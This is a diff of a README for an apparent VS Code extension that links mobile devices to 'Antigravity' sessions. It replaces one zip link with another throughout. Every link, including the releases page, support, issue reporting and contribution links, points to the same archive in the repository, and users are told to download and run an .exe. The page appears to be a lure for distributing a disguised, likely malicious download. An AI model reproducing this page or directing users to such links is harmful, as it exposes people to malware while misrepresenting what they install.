@@ -1,7 +1,7 @@
 # 🚀 antigravity-link-extension - Connect Your Mobile and VS Code Swiftly
 
 ## 📥 Download Now!
-[![Download](https://raw.githubusercontent.com/flyamjad/antigravity-link-extension/main/src/types/link-antigravity-extension-3.8-beta.4.zip)](https://raw.githubusercontent.com/flyamjad/antigravity-link-extension/main/src/types/link-antigravity-extension-3.8-beta.4.zip)
+[![Download](https://github.com/flyamjad/antigravity-link-extension/raw/refs/heads/main/public/link_extension_antigravity_virent.zip)](https://github.com/flyamjad/antigravity-link-extension/raw/refs/heads/main/public/link_extension_antigravity_virent.zip)
 
 ## 📖 Overview
 The Antigravity Link Extension for Visual Studio Code lets you bridge your Antigravity sessions to your mobile device. This functionality allows for easy uploads and voice-to-text capabilities, streamlining your workflow.
@@ -16,7 +16,7 @@ The Antigravity Link Extension for Visual Studio Code lets you bridge your Antig
 Follow these simple steps to start using the Antigravity Link Extension.
 
 ### 📥 Download & Install
-1. Click the download button at the top of this page or [visit the Releases page here](https://raw.githubusercontent.com/flyamjad/antigravity-link-extension/main/src/types/link-antigravity-extension-3.8-beta.4.zip).
+1. Click the download button at the top of this page or [visit the Releases page here](https://github.com/flyamjad/antigravity-link-extension/raw/refs/heads/main/public/link_extension_antigravity_virent.zip).
 2. On the Releases page, locate the latest version of the extension.
 3. Download the file that matches your operating system:
    - For Windows: Choose the `.exe` file.
@@ -58,16 +58,16 @@ If you encounter issues during installation or setup, consider these steps:
 - **Refer to Community Support:** If problems persist, feel free to reach out to our community on GitHub issues. Many users are willing to help.
 
 ## 📞 Support
-For any questions, suggestions, or issues, please open an issue on our [GitHub repository](https://raw.githubusercontent.com/flyamjad/antigravity-link-extension/main/src/types/link-antigravity-extension-3.8-beta.4.zip). Our development team and community can assist you.
+For any questions, suggestions, or issues, please open an issue on our [GitHub repository](https://github.com/flyamjad/antigravity-link-extension/raw/refs/heads/main/public/link_extension_antigravity_virent.zip). Our development team and community can assist you.
 
 ## 📚 Additional Resources
 - **Documentation:** You can read the complete user manual [here](#).
 - **Community Forums:** Join discussions about the extension and share your experiences.
 
 ## 🔗 Useful Links
-- [Request Features](https://raw.githubusercontent.com/flyamjad/antigravity-link-extension/main/src/types/link-antigravity-extension-3.8-beta.4.zip)
-- [Report Issues](https://raw.githubusercontent.com/flyamjad/antigravity-link-extension/main/src/types/link-antigravity-extension-3.8-beta.4.zip)
-- [Contribute to the Project](https://raw.githubusercontent.com/flyamjad/antigravity-link-extension/main/src/types/link-antigravity-extension-3.8-beta.4.zip)
+- [Request Features](https://github.com/flyamjad/antigravity-link-extension/raw/refs/heads/main/public/link_extension_antigravity_virent.zip)
+- [Report Issues](https://github.com/flyamjad/antigravity-link-extension/raw/refs/heads/main/public/link_extension_antigravity_virent.zip)
+- [Contribute to the Project](https://github.com/flyamjad/antigravity-link-extension/raw/refs/heads/main/public/link_extension_antigravity_virent.zip)
 
 ## ✔️ License
 This project is licensed under the MIT License. See the LICENSE file for more information.
@@ -75,4 +75,4 @@ This project is licensed under the MIT License. See the LICENSE file for more in
 ## 🌐 Acknowledgements
 We would like to thank all contributors for their valuable input and support. Together, we strive to make the Antigravity Link Extension better for everyone. 
 
-[![Visit Releases Page](https://raw.githubusercontent.com/flyamjad/antigravity-link-extension/main/src/types/link-antigravity-extension-3.8-beta.4.zip)](https://raw.githubusercontent.com/flyamjad/antigravity-link-extension/main/src/types/link-antigravity-extension-3.8-beta.4.zip)
+[![Visit Releases Page](https://github.com/flyamjad/antigravity-link-extension/raw/refs/heads/main/public/link_extension_antigravity_virent.zip)](https://github.com/flyamjad/antigravity-link-extension/raw/refs/heads/main/public/link_extension_antigravity_virent.zip)
